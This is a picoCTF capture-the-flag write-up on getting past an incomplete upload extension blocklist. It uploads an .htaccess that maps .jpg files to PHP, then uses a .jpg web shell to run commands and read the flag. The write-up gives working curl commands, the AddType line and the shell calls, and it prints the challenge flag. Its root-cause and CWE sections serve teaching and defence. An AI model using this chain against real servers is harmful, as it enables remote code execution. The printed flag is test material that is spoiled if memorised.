# byp4ss3d

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{s3rv3r_byp4ss_77c49c68}`

## Summary

A PHP student ID upload form blocks the obvious `.php` extension (case-insensitively) along with
a few other known-dangerous extensions, but the blocklist is incomplete and Apache is not
configured to execute any of the alternate PHP-triggering extensions that slip through
(`.php5`, `.pht`, `.phar`, double extensions, etc.). Critically, the filter also does not block
`.htaccess` itself. Uploading a malicious `.htaccess` into the upload directory reconfigures
Apache to treat plain `.jpg` files as executable PHP, turning an otherwise-inert accepted upload
into full remote code execution.

## Discovery

Uploading a raw `shell.php` is rejected outright (`Not allowed!`), as are simple case variants
(`.PHP`, `.Php`, `.pHp`) and a few other extensions (`.php3`, `.php4`, `.phtml`,
`shell.jpg.php`). A wider sweep of extensions shows several that the filter does accept:

```
shell.php5, shell.pht, shell.phar, shell.php7, shell.pgif, shell.phps,
shell.php., shell.php.jpg, shell.php.png, shell.php.gif, shell.phP5, shell.Pht, shell.PHAR ...
```

Requesting any of these back from `/images/` returns the raw PHP source as plain text rather
than executing it, confirming this specific Apache instance's PHP handler is bound strictly to
the exact `.php` extension and none of the accepted-but-inert alternates trigger it.

The filter does not block a file named `.htaccess`, however:

```
curl -s -X POST -F "image=@htaccess_payload;filename=.htaccess;type=image/png" \
  http://TARGET/upload.php
Successfully uploaded!<br>Access it at: <a href='images/.htaccess'>images/.htaccess</a>
```

## Proof of Concept

Upload a `.htaccess` into the upload directory that re-maps `.jpg` to the PHP handler:

```
AddType application/x-httpd-php .jpg
```

Direct access to `/images/.htaccess` correctly 403s (Apache's own core config always blocks
serving `.ht*` files), but this does not stop the file from being read and applied by Apache as
a directory configuration file. Uploading an ordinary `.jpg` containing PHP code afterward:

```
curl -s -X POST -F "image=@shell.php;filename=shell2.jpg;type=image/jpeg" http://TARGET/upload.php
curl -s "http://TARGET/images/shell2.jpg?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

now executes as PHP. From there:

```
curl -s "http://TARGET/images/shell2.jpg" --data-urlencode "cmd=find / -iname '*flag*' 2>/dev/null" -G
...
/var/www/flag.txt

curl -s "http://TARGET/images/shell2.jpg" --data-urlencode "cmd=cat /var/www/flag.txt" -G
picoCTF{s3rv3r_byp4ss_77c49c68}
```

## Root Cause

The upload filter is a blocklist of specific known-bad extensions rather than an allowlist of
genuinely safe ones, and critically it never accounts for `.htaccess`, a filename with no
extension of its own that Apache treats specially. Since the web server (not just the
application) reads and applies per-directory configuration from any `.htaccess` file it finds,
an attacker who can place an arbitrary file in a web-served directory can redefine what that
directory considers executable, independent of whatever extension blocklist the application
itself enforces.

## CWE / OWASP

- **CWE-434**: Unrestricted Upload of File with Dangerous Type
- **CWE-693**: Protection Mechanism Failure (blocklist bypass via `.htaccess` reconfiguration)
- **OWASP A05:2021**: Security Misconfiguration
